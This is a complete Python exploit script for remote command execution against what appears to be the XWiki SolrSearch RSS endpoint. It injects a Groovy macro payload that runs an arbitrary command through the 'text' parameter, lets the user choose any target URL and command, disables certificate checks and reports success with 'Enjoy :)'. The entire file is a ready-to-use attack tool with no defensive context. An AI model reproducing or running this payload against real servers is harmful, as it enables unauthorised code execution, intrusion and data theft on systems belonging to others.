import requests, argparse

from urllib.parse import quote

def encoded_url(payload):

	return quote(payload, safe='')

def crafting_payload(command):

	c = f'''println("{command}".execute().text)'''

	p = f'''}}}}}}{{{{async async=false}}}}{{{{groovy}}}}
			{c}{{{{/groovy}}}}{{{{/async}}}}'''

	return p

def exploit(targeturl, command):

	if not targeturl.endswith('/'):
		targeturl += '/'

	payload = crafting_payload(command)

	encoded_payload = encoded_url(payload)

	target = f'{targeturl}bin/get/Main/SolrSearch?media=rss&text={encoded_payload}'

	try:

		headers = {

			'User-Agent': 'Mozilla/5.0',

			'Accept': '*/*',

			'Connection': 'keep-alive'
		}

		r = requests.get(target, headers=headers, verify=False, allow_redirects=True)

		if r.status_code == 200:

			print('[*] Command:', command)

			print('[*] Target Url:', targeturl)

			print('[*] Exploit Url:', target)

			space_command = command.replace(' ', '%20')

			count = r.text.count(space_command)

			if count >= 2 and 'Failed' not in r.text:

				print(f'\n[+] Exploit successful, Enjoy :)')

			else:

				print('\n[-] Something wrong in request, make sure you use everything correct.')

		else:

			print(f'[-] HTTP code: {r.status_code} - Maybe patched or blocked.')

	except requests.exceptions.Timeout as time_err:

		print('[x] Timeout Error:',time_err)

	except requests.exceptions.ConnectionError as conn_err:

		print('[x] Connection Error:',conn_err)

	except requests.exceptions.HTTPError as http_err:

		print('[x] Http Error:',http_err)

	except requests.exceptions.TooManyRedirects as tm_red:

		print('[x] TooManyRedirects Error:',tm_red)


if __name__ == '__main__':

	parser = argparse.ArgumentParser()

	parser.add_argument('url', help='target url')

	parser.add_argument('cmd', help='command to run')

	args = parser.parse_args()

	exploit(args.url, args.cmd)